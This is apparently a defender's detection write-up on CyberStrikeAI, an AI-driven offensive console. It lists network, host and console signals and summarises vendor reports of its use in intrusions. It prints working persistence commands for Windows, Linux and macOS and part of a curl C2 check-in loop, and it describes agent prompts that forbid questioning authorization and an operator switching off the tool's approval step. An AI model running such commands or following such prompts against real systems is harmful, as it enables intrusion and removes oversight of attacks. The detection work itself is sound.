# What CyberStrikeAI leaves behind

CyberStrikeAI ([AIPentest/CyberStrikeAI](https://github.com/AIPentest/CyberStrikeAI), first published as Ed1s0nZ/CyberStrikeAI on November 8, 2025, reviewed at `af6cf750`, November 19, 2026) is a Go operator console, not just an agent. Its AI agents plan and run about 90 security tools, and the console also builds its own implants, runs C2 listeners, manages webshells and takes orders from chat platforms. It has had more than 2,400 commits in its first year. File references are to the repository at `af6cf750`.

**Fragility** says what it takes to remove a signal: *code* means editing CyberStrikeAI, *config* means its `config.yaml` or a listener setting, *operator* means a choice made at run time.

## How it runs

| Part | What it does | Code |
|---|---|---|
| Console | One binary, `cyberstrike-ai`, built by `run.sh`. Gin web UI and API on `0.0.0.0:8080`, HTTPS with a self-signed certificate made at every start. A built-in `admin` account gets a random password on first run | `run.sh:93`, `config.example.yaml`, `internal/security/auth_manager.go:139` |
| Agents | Orchestrator and specialist agents (penetration, lateral movement, vulnerability triage, reporting) over any OpenAI-compatible or Claude model. Tools are YAML wrappers for nmap, nuclei, sqlmap, amass, bloodhound and about 85 others, plus a shell (`execute`) | `agents/`, `tools/` |
| Autonomy | Tool approval (`hitl.default_mode`) is off by default. When it is on, an "audit agent" reviews calls with a prompt that says to approve exploits, webshell uploads, reverse shells and password attacks, and to approve when unsure. The orchestrator prompt says authorization was settled in advance and must never be questioned. The only built-in target block is a regular expression for `.gov` domains | `config.example.yaml`, `agents/orchestrator.md:9-21` |
| Implants | The console compiles a Go implant per listener from `internal/c2/payload_templates/beacon.go.tmpl` with `go build -ldflags "-s -w -buildid=" -trimpath` inside its own module, in `tmp/c2/payloads/build-<8 hex>` | `internal/c2/payload_builder.go:146-202` |
| C2 listeners | `http_beacon`, `https_beacon`, `tcp_reverse`, `websocket`, plus one-liners (bash `/dev/tcp`, `nc -e`, `mkfifo`, base64 python, encoded PowerShell, perl, and a curl loop). The operator picks the ports | `internal/c2/` |
| Webshells | A webshell manager that sends commands to a planted PHP, JSP or ASPX shell with `pass` and `cmd` parameters | `internal/handler/webshell.go` |
| Recon and chat | FOFA, ZoomEye, Quake and Shodan queries from the console; bots on Telegram, Slack, Discord, DingTalk, Lark, WeCom, QQ and WeChat | `internal/handler/fofa.go`, `internal/robot/` |
| Storage | `data/conversations.db` (conversations, tool runs, C2 sessions, webshell connections), `data/knowledge.db`, `tmp/c2`, `log/diagnostic-<date>.log` | `config.example.yaml` |

## Signals on the target side

| Signal | What it looks like | Code | Fragility |
|---|---|---|---|
| Webshell manager | User agent `Mozilla/5.0 (compatible; CyberStrikeAI-WebShell/1.0)` on every request to a webshell, commands in `cmd` next to `pass`, POSTed as a form or in the query string | `internal/handler/webshell.go:799,824-850` | Code |
| OS probe | The first command on every new webshell is `echo :OSPROBE_%OS%:END`, run by the web server's shell. Windows answers `:OSPROBE_Windows_NT:END` | `internal/handler/webshell_probe.go:13` | Code |
| Implant check-ins | `POST /check_in`, then `GET /tasks?session_id=<id>`, results to `/result`, files through `/upload` and `/file/`. Every request carries `X-Implant-Token` (fixed per listener) and `X-Session-Token` | `beacon.go.tmpl:373-584`, `internal/c2/types.go:151-157` | Code (headers), config (paths) |
| Implant timing | 5-second sleep and 0 percent jitter by default, which Elastic also notes | `internal/c2/types.go:165-169` | Config |
| Implant user agent | `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36`, a Chrome string that stops before `(KHTML, like Gecko)`. No browser sends it. Match the whole value | `internal/c2/payload_builder.go:139` | Config |
| TCP implant | Sends the 4 bytes `CSB1` on its own, then 4-byte big-endian length frames of AES-GCM data | `internal/c2/tcp_beacon_server.go:24`, `beacon.go.tmpl:172-200` | Code |
| curl one-liner | `bash -c 'H="X-Implant-Token: ..."; ... curl -fsSk ... -X POST "$URL/check_in" ...; sleep 5; done' &`, with a session token from `od -An -N32 -tx1 /dev/urandom` | `internal/c2/payload_oneliner.go:184-200` | Code |
| Listener on a bad token | Answers `404` with the body `<html><body><h1>404 Not Found</h1></body></html>` | `internal/c2/listener_http.go:460-464` | Code |
| Skills | When blocked, its skills tell the agent to rotate `X-Forwarded-For`, `X-Real-IP`, `CF-Connecting-IP` and `True-Client-IP`, switch proxies and user agents, then fall back to free proxies in the target's country and Tor | `skills/redteam-opsec/SKILL.md` | Operator |

## Signals on a compromised host

| Signal | What it looks like | Code | Fragility |
|---|---|---|---|
| Windows persistence | `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SystemUpdate /t REG_SZ /d "<implant>" /f`, then `schtasks /create /tn "SystemUpdate" /tr "<implant>" /sc onlogon /rl highest /f`, both through `cmd /c` | `beacon.go.tmpl:1325-1340` | Code |
| Linux persistence | `(crontab -l 2>/dev/null; echo '@reboot <implant> &') \| sort -u \| crontab -`, then `(nohup <implant> &>/dev/null &) # cs` appended to `~/.bashrc` | `beacon.go.tmpl:1273-1293` | Code |
| macOS persistence | `~/Library/LaunchAgents/com.apple.systemupdate.plist`, label `com.apple.systemupdate`, `RunAtLoad` and `KeepAlive`, output to `/dev/null` | `beacon.go.tmpl:1296-1318` | Code |
| Build information | `go version -m` on any implant shows `path cyberstrike-ai/tmp/c2/payloads/build-<8 hex>` and `mod cyberstrike-ai`. Kaspersky used this, and the VCS fields, to group samples | `payload_builder.go:146` | Code |
| File names | `beacon_<os>_<arch>_p_<14 hex>` when the operator does not name the file. In real attacks Kaspersky saw `svchosts.exe` in `C:\Windows\Temp` | `payload_builder.go:180-186` | Operator |
| Commands | Windows commands run as `cmd /c <command>` and Unix commands as `/bin/sh -c <command>`, children of the implant | `beacon.go.tmpl:720-742` | Code |

## Signals on a host that runs CyberStrikeAI

| Signal | What it looks like | Fragility |
|---|---|---|
| Console | `cyberstrike-ai` listening on 8080 and on every C2 listener port, starting `go build` for each implant | Config (ports) |
| Outbound | `CyberStrikeAI/1.7.4` to FOFA, ZoomEye, Quake and Shodan APIs, `CyberStrikeAI/1.0` to `ilinkai.weixin.qq.com`, and chat platform APIs | Code |
| Files | `data/conversations.db`, `data/knowledge.db`, `tmp/c2/payloads/`, `log/diagnostic-<date>.log` in its working folder | Config |

## An exposed CyberStrikeAI console

The console's page title is `CyberStrikeAI`. Its certificate has subject and issuer `CN=CyberStrikeAI`, an ECDSA P-256 key, SAN `localhost`, `127.0.0.1` and `::1`, and one year of validity from the moment the process started, so the not-before date tells you when the console last restarted (`internal/app/main_server_tls.go:103-121`). HTTPS listeners without a certificate get the same kind of certificate with the listener's name as the common name (`internal/c2/listener_http.go:526-548`).

The favicon has changed over time: Shodan hash `-1349384020` since July 28, 2026, `-1149488178` from April to July 2026 and `-1389405690` from January to April 2026, all verified against the repository history. The current file's SHA-256 is `483ddc84…5d4b7`. The login wordmark class `brand-wordmark__core`, the `c2.css` stylesheet and the `cyberstrike-theme` storage key survive renaming: Spectrum Security matched 336 services on the wordmark, including renamed builds such as DarkAI, and 543 on `c2.css`. PenTestIT counted 220 addresses with its title and icon on Shodan on November 13, 2026. An exposed console is not proof of malicious use: researchers, students and honeypots run them too.

Do not confuse it with CyberStrike (`CyberStrikeus/cyberstrike`), an unrelated project that sends `cyberstrike/<version>` user agents.

## Signals in model traffic

Where model traffic is inspected, CyberStrikeAI requests carry Chinese-language system prompts: the orchestrator's `授权状态` (authorization status) block saying permission checks are complete and must not be questioned, and the audit agent's `你是 CyberStrikeAI 人机协同审计 Agent`. Tool names include `execute`, `record_vulnerability`, `upsert_project_fact`, `c2_listener`, `manage_webshell_list` and `wait_tool_execution`.

## What has been seen in the wild

- **Team Cymru** (March 2, 2026) found 21 addresses running CyberStrikeAI from January 20 to February 26, 2026, mostly in China, Singapore and Hong Kong. One, `212.11.64[.]250`, showed a CyberStrikeAI banner on 8080 and talked to FortiGate devices targeted in the campaign that Amazon reported compromised more than 600 FortiGate firewalls in 55 countries between January 11 and February 18, 2026. Team Cymru tied the developer, Ed1s0nZ, to Knownsec 404's Starlink project and a CNNVD contribution award, and assesses the tool may be used by Chinese state-sponsored groups.
- **Kaspersky** (November 2, 2026) found CyberStrikeAI implants used against education organizations in Africa and Latin America. Operators came in through a SQL Server, deployed the implant two weeks later, set the SystemUpdate task and Run value in two minutes, spent five hours on domain recon, and later moved over SMB and WMI, dumped LSASS with `comsvcs.dll` by process ID, ran a renamed mimikatz (`wdiag2.exe`) for DCSync and a Golden Ticket, and exported databases, all within an hour. The implant was `svchosts.exe` in `C:\Windows\Temp`, with C2 at `185.186.245[.]144`, `104.234.26[.]163`, `fastcdn[.]bar` and `media.fastcdn[.]bar`. Console restarts fell in UTC+8 business hours.
- **Elastic** (November 13, 2026) traced an AWS intrusion to a CyberStrikeAI console at `43.240.29[.]11` (Hong Kong): eight identities across four accounts from September 30 to October 16, 2026, with three accounts checked in the same second and 56 user data reads in 141 milliseconds. Two more consoles in the same /24 served the same certificate (serial `3356730520974368630`).
- **Huntback** (November 17, 2026) recovered an operator's full session from a workspace exposed on `38.76.169[.]207` port 8010: 221 tool runs, mostly `execute`, after four reviews by the audit agent failed and approval was switched off.

## What the code does not contain

The implant has no AI of its own; the model runs on the console, which sends the implant shell commands. The persistence names, headers and build path above are defaults of the stock template, and the operator can rebuild it. Kaspersky's samples still carried them.
